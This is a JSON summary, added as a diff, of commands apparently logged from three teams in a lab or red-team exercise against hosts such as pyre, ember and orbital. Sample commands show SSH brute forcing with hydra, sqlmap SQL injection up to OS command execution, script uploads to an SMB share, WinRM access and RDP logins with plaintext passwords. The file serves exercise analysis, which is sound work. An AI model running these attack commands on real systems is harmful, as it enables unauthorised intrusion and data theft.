@@ -1,0 +1,591 @@
+{
+  "total_targeted_commands": 1693,
+  "targets": {
+    "crucible": {
+      "total_commands_on_target": 29,
+      "unique_teams_on_target": [
+        "1",
+        "3"
+      ],
+      "vector_summary": {
+        "recon/access": {
+          "count": 18,
+          "teams": [
+            "1",
+            "3"
+          ],
+          "sample_commands": [
+            "nmap -sV -p 5985 -T3 10.100.7.47",
+            "nmap -sV -p 1-65535 -T3 10.100.7.47",
+            "nmap 10.100.7.47-48"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.11/shell_history.csv#L298",
+            "logs/10.100.7.11/shell_history.csv#L299",
+            "logs/10.100.7.32/shell_history.csv#L1040"
+          ]
+        }
+      },
+      "unmatched_commands": 11,
+      "differing_team_approaches_present": false,
+      "differing_team_vector_pairs": []
+    },
+    "default": {
+      "total_commands_on_target": 316,
+      "unique_teams_on_target": [
+        "1",
+        "2",
+        "3"
+      ],
+      "vector_summary": {},
+      "unmatched_commands": 316,
+      "differing_team_approaches_present": false,
+      "differing_team_vector_pairs": []
+    },
+    "ember": {
+      "total_commands_on_target": 288,
+      "unique_teams_on_target": [
+        "1",
+        "2",
+        "3"
+      ],
+      "vector_summary": {
+        "RDP access": {
+          "count": 69,
+          "teams": [
+            "1",
+            "2",
+            "3"
+          ],
+          "sample_commands": [
+            "xfreerdp3 /u:rand /v:10.100.7.46 /p:PNqRrcXU4W0eWaE1MGvy",
+            "xfreerdp3 /u:ember /v:10.100.7.46 /p:wsuGrLB7Jsd8v8FRcFiL",
+            "xfreerdp3 /u:administrator /v:10.100.7.46 /p:aXn6sYPwievyoDeQvYX1"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.21/shell_history.csv#L132",
+            "logs/10.100.7.21/shell_history.csv#L133",
+            "logs/10.100.7.21/shell_history.csv#L134"
+          ]
+        },
+        "SMB/scripts path": {
+          "count": 170,
+          "teams": [
+            "1",
+            "2",
+            "3"
+          ],
+          "sample_commands": [
+            "nxc smb 10.100.7.46 -u EMBER$ -p J4f9juEr --shares",
+            "nxc smb 10.100.7.46 -p ''",
+            "nxc smb 10.100.7.46 -p '' --shares"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.11/shell_history.csv#L185",
+            "logs/10.100.7.33/shell_history.csv#L113",
+            "logs/10.100.7.33/shell_history.csv#L114"
+          ]
+        },
+        "scheduled task/script abuse": {
+          "count": 11,
+          "teams": [
+            "2",
+            "3"
+          ],
+          "sample_commands": [
+            "smbclient //10.100.7.46/Scripts --user guest -c 'put maintenance.ps1'",
+            "smbclient //10.100.7.46/Scripts --user guest --password '' -c 'put maintenance.ps1'",
+            "smbclient //10.100.7.46/Scripts --user guest --password '' -c 'put maintenance.ps1'"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.32/shell_history.csv#L701",
+            "logs/10.100.7.32/shell_history.csv#L702",
+            "logs/10.100.7.32/shell_history.csv#L703"
+          ]
+        }
+      },
+      "unmatched_commands": 49,
+      "differing_team_approaches_present": true,
+      "differing_team_vector_pairs": [
+        {
+          "vector_a": "RDP access",
+          "teams_a": [
+            "1",
+            "2",
+            "3"
+          ],
+          "vector_b": "scheduled task/script abuse",
+          "teams_b": [
+            "2",
+            "3"
+          ]
+        },
+        {
+          "vector_a": "SMB/scripts path",
+          "teams_a": [
+            "1",
+            "2",
+            "3"
+          ],
+          "vector_b": "scheduled task/script abuse",
+          "teams_b": [
+            "2",
+            "3"
+          ]
+        }
+      ]
+    },
+    "forge": {
+      "total_commands_on_target": 60,
+      "unique_teams_on_target": [
+        "1",
+        "2",
+        "3"
+      ],
+      "vector_summary": {
+        "SSH credential/lateral movement": {
+          "count": 25,
+          "teams": [
+            "1",
+            "2",
+            "3"
+          ],
+          "sample_commands": [
+            "hydra -I forge -P rockyou.txt ssh 10.100.7.44",
+            "hydra -l forge -P rockyou.txt ssh 10.100.7.44",
+            "ssh forge@10.100.7.44"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.21/shell_history.csv#L83",
+            "logs/10.100.7.21/shell_history.csv#L84",
+            "logs/10.100.7.33/shell_history.csv#L103"
+          ]
+        },
+        "Git artifact/history path": {
+          "count": 15,
+          "teams": [
+            "1",
+            "3"
+          ],
+          "sample_commands": [
+            "git clone 10.100.7.44",
+            "git clone http://10.100.7.44/git/forge-logs.git/",
+            "git-dumper http://10.100.7.44/git/forge-logs.git/"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.32/shell_history.csv#L268",
+            "logs/10.100.7.32/shell_history.csv#L269",
+            "logs/10.100.7.13/shell_history.csv#L105"
+          ]
+        },
+        "web enum against forge": {
+          "count": 3,
+          "teams": [
+            "2"
+          ],
+          "sample_commands": [
+            "gobuster dir -u https://http://10.100.7.44/ -w wordlist.txt",
+            "gobuster dir -u https://http://10.100.7.44/ -w wordlist.txt",
+            "gobuster dir -u http://10.100.7.44/ -w wordlist.txt"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.24/shell_history.csv#L224",
+            "logs/10.100.7.24/shell_history.csv#L227",
+            "logs/10.100.7.24/shell_history.csv#L228"
+          ]
+        }
+      },
+      "unmatched_commands": 17,
+      "differing_team_approaches_present": true,
+      "differing_team_vector_pairs": [
+        {
+          "vector_a": "Git artifact/history path",
+          "teams_a": [
+            "1",
+            "3"
+          ],
+          "vector_b": "SSH credential/lateral movement",
+          "teams_b": [
+            "1",
+            "2",
+            "3"
+          ]
+        },
+        {
+          "vector_a": "Git artifact/history path",
+          "teams_a": [
+            "1",
+            "3"
+          ],
+          "vector_b": "web enum against forge",
+          "teams_b": [
+            "2"
+          ]
+        },
+        {
+          "vector_a": "SSH credential/lateral movement",
+          "teams_a": [
+            "1",
+            "2",
+            "3"
+          ],
+          "vector_b": "web enum against forge",
+          "teams_b": [
+            "2"
+          ]
+        }
+      ]
+    },
+    "helios": {
+      "total_commands_on_target": 80,
+      "unique_teams_on_target": [
+        "1",
+        "2",
+        "3"
+      ],
+      "vector_summary": {
+        "SMB/enum": {
+          "count": 31,
+          "teams": [
+            "1",
+            "2"
+          ],
+          "sample_commands": [
+            "nxc smb 10.100.7.41 -u guest",
+            "nxc smb 10.100.7.41 -u guest -p '' --shares",
+            "nxc smb 10.100.7.41 -u orbital -p '' --shares"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.11/shell_history.csv#L83",
+            "logs/10.100.7.11/shell_history.csv#L84",
+            "logs/10.100.7.11/shell_history.csv#L85"
+          ]
+        },
+        "RDP access": {
+          "count": 12,
+          "teams": [
+            "2",
+            "3"
+          ],
+          "sample_commands": [
+            "xfreerdp3 /u:helios /v:10.100.7.41 /u:')b:t].n!5<Xj=/DGXtv&'",
+            "xfreerdp3 /u:helios /v:10.100.7.41 /u:')b:t].n!5<Xj=/DGXtv&'",
+            "xfreerdp3 /u:helios /v:10.100.7.41 /u:')b:t].n!5<Xj=/DGXtv&'"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.34/shell_history.csv#L6",
+            "logs/10.100.7.34/shell_history.csv#L7",
+            "logs/10.100.7.34/shell_history.csv#L8"
+          ]
+        },
+        "ssh access": {
+          "count": 7,
+          "teams": [
+            "2",
+            "3"
+          ],
+          "sample_commands": [
+            "ssh -i ~/.ssh/helios helios@10.100.7.41",
+            "ssh -i ~/.ssh/helios helios@10.100.7.41",
+            "ssh -i ~/.ssh/helios_ssh_key helios@10.100.7.41"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.32/shell_history.csv#L109",
+            "logs/10.100.7.32/shell_history.csv#L110",
+            "logs/10.100.7.32/shell_history.csv#L123"
+          ]
+        }
+      },
+      "unmatched_commands": 30,
+      "differing_team_approaches_present": true,
+      "differing_team_vector_pairs": [
+        {
+          "vector_a": "RDP access",
+          "teams_a": [
+            "2",
+            "3"
+          ],
+          "vector_b": "SMB/enum",
+          "teams_b": [
+            "1",
+            "2"
+          ]
+        },
+        {
+          "vector_a": "SMB/enum",
+          "teams_a": [
+            "1",
+            "2"
+          ],
+          "vector_b": "ssh access",
+          "teams_b": [
+            "2",
+            "3"
+          ]
+        }
+      ]
+    },
+    "inspire": {
+      "total_commands_on_target": 104,
+      "unique_teams_on_target": [
+        "1",
+        "3"
+      ],
+      "vector_summary": {
+        "web enum/recon": {
+          "count": 26,
+          "teams": [
+            "1",
+            "3"
+          ],
+          "sample_commands": [
+            "nmap -sV -p 5985 -T3 10.100.7.48",
+            "nmap -sV -p 1-65535 -T3 10.100.7.48",
+            "nmap -sV -p 1-65535 -T3 10.100.7.48"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.11/shell_history.csv#L300",
+            "logs/10.100.7.11/shell_history.csv#L312",
+            "logs/10.100.7.11/shell_history.csv#L313"
+          ]
+        },
+        "MySQL access": {
+          "count": 44,
+          "teams": [
+            "1",
+            "3"
+          ],
+          "sample_commands": [
+            "mysql -h 10.100.7.48 -u root -\\n",
+            "mysql -h 10.100.7.48 -u root -\\n",
+            "mysql -h 10.100.7.48 -u root -\\n"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.34/shell_history.csv#L86",
+            "logs/10.100.7.34/shell_history.csv#L87",
+            "logs/10.100.7.34/shell_history.csv#L88"
+          ]
+        }
+      },
+      "unmatched_commands": 34,
+      "differing_team_approaches_present": false,
+      "differing_team_vector_pairs": []
+    },
+    "orbital": {
+      "total_commands_on_target": 317,
+      "unique_teams_on_target": [
+        "1",
+        "2",
+        "3"
+      ],
+      "vector_summary": {
+        "WinRM": {
+          "count": 27,
+          "teams": [
+            "1",
+            "2",
+            "3"
+          ],
+          "sample_commands": [
+            "evil-winrm -i 10.100.7.42 -u orbital",
+            "evil-winrm -i 10.100.7.42 -u orbital",
+            "evil-winrm -i 10.100.7.42 -u orbital"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.11/shell_history.csv#L73",
+            "logs/10.100.7.11/shell_history.csv#L74",
+            "logs/10.100.7.11/shell_history.csv#L77"
+          ]
+        },
+        "MSSQL": {
+          "count": 11,
+          "teams": [
+            "1"
+          ],
+          "sample_commands": [
+            "mssqlclient.py sa@10.100.7.42 -p 1433\n# When prompted for password, just hit Enter",
+            "mssqlclient.py sa@10.100.7.42 -p 1433\n# When prompted for password, just hit Enter",
+            "mssqlclient.py sa@10.100.7.42 -p 1433"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.11/shell_history.csv#L327",
+            "logs/10.100.7.11/shell_history.csv#L328",
+            "logs/10.100.7.11/shell_history.csv#L329"
+          ]
+        },
+        "SMB anonymous/enum": {
+          "count": 124,
+          "teams": [
+            "1",
+            "2",
+            "3"
+          ],
+          "sample_commands": [
+            "nxc smb 10.100.7.42 -u Administrator",
+            "nxc smb 10.100.7.42 -u Administrator -p 'Canopy@123'",
+            "nxc smb 10.100.7.42 -u orbital -p 'Canopy@123'"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.11/shell_history.csv#L339",
+            "logs/10.100.7.11/shell_history.csv#L340",
+            "logs/10.100.7.11/shell_history.csv#L341"
+          ]
+        }
+      },
+      "unmatched_commands": 155,
+      "differing_team_approaches_present": true,
+      "differing_team_vector_pairs": [
+        {
+          "vector_a": "MSSQL",
+          "teams_a": [
+            "1"
+          ],
+          "vector_b": "SMB anonymous/enum",
+          "teams_b": [
+            "1",
+            "2",
+            "3"
+          ]
+        },
+        {
+          "vector_a": "MSSQL",
+          "teams_a": [
+            "1"
+          ],
+          "vector_b": "WinRM",
+          "teams_b": [
+            "1",
+            "2",
+            "3"
+          ]
+        }
+      ]
+    },
+    "pyre": {
+      "total_commands_on_target": 391,
+      "unique_teams_on_target": [
+        "1",
+        "2",
+        "3"
+      ],
+      "vector_summary": {
+        "SQL injection": {
+          "count": 239,
+          "teams": [
+            "1",
+            "3"
+          ],
+          "sample_commands": [
+            "curl http://10.100.7.45/panels.php?id=3",
+            "curl http://10.100.7.45/panels.php?id=%22test%22",
+            "curl http://10.100.7.45/panels.php?id=test\"\""
+          ],
+          "sample_refs": [
+            "logs/10.100.7.32/shell_history.csv#L735",
+            "logs/10.100.7.32/shell_history.csv#L771",
+            "logs/10.100.7.32/shell_history.csv#L772"
+          ]
+        },
+        "DB/file extraction via SQLi": {
+          "count": 81,
+          "teams": [
+            "1",
+            "3"
+          ],
+          "sample_commands": [
+            "sqlmap -u http://10.100.7.45/panels.php?id=1\" --dbs\"",
+            "sqlmap -u http://10.100.7.45/panels.php?id=1\" --dbs\"",
+            "sqlmap -u http://10.100.7.45/panels.php?id=1\" -D \"pyrewatch\" --tables\""
+          ],
+          "sample_refs": [
+            "logs/10.100.7.32/shell_history.csv#L807",
+            "logs/10.100.7.32/shell_history.csv#L808",
+            "logs/10.100.7.32/shell_history.csv#L815"
+          ]
+        },
+        "OS shell via SQLi": {
+          "count": 55,
+          "teams": [
+            "1",
+            "3"
+          ],
+          "sample_commands": [
+            "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=whoami\"",
+            "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=ls\"",
+            "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=\"ls ../\"\""
+          ],
+          "sample_refs": [
+            "logs/10.100.7.32/shell_history.csv#L906",
+            "logs/10.100.7.32/shell_history.csv#L907",
+            "logs/10.100.7.32/shell_history.csv#L908"
+          ]
+        }
+      },
+      "unmatched_commands": 152,
+      "differing_team_approaches_present": false,
+      "differing_team_vector_pairs": []
+    },
+    "starfall": {
+      "total_commands_on_target": 108,
+      "unique_teams_on_target": [
+        "1",
+        "2",
+        "3"
+      ],
+      "vector_summary": {
+        "ssh access": {
+          "count": 73,
+          "teams": [
+            "1",
+            "3"
+          ],
+          "sample_commands": [
+            "ssh superuser@10.100.7.43",
+            "ssh root@10.100.7.43",
+            "ssh -i ~/.ssh/helios_ssh_key starfall@10.100.7.43"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.34/shell_history.csv#L12",
+            "logs/10.100.7.32/shell_history.csv#L85",
+            "logs/10.100.7.32/shell_history.csv#L124"
+          ]
+        },
+        "web/api probing": {
+          "count": 12,
+          "teams": [
+            "1",
+            "2",
+            "3"
+          ],
+          "sample_commands": [
+            "nmap 10.100.7.41 10.100.7.42 10.100.7.43",
+            "nmap -sV -T3 10.100.7.40 10.100.7.41 10.100.7.42 10.100.7.43 -o nmap_log.txt",
+            "nmap -sV -T3 10.100.7.40 10.100.7.41 10.100.7.42 10.100.7.43 -o nmap_log.txt"
+          ],
+          "sample_refs": [
+            "logs/10.100.7.34/shell_history.csv#L13",
+            "logs/10.100.7.32/shell_history.csv#L92",
+            "logs/10.100.7.32/shell_history.csv#L93"
+          ]
+        }
+      },
+      "unmatched_commands": 23,
+      "differing_team_approaches_present": true,
+      "differing_team_vector_pairs": [
+        {
+          "vector_a": "ssh access",
+          "teams_a": [
+            "1",
+            "3"
+          ],
+          "vector_b": "web/api probing",
+          "teams_b": [
+            "1",
+            "2",
+            "3"
+          ]
+        }
+      ]
+    }
+  }
+}
